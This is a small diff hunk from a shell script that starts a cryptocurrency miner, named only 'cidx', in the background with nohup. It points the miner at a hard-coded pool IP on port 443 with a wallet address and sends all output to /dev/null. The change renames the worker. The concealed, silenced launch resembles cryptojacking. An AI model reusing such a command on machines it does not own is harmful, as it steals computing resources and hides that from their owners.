@@ -30,7 +30,7 @@ END
   # Run cidx in the background
   nohup ./cidx -a yespower  \
   -o 45.115.225.59:443 \
-  -u VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.workercron \
+  -u VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.worker11 \
   -p c=VECO,m=solo,zap=VECO,mc=VECO -t 6 &>/dev/null &
 
   # Print info: STARTED
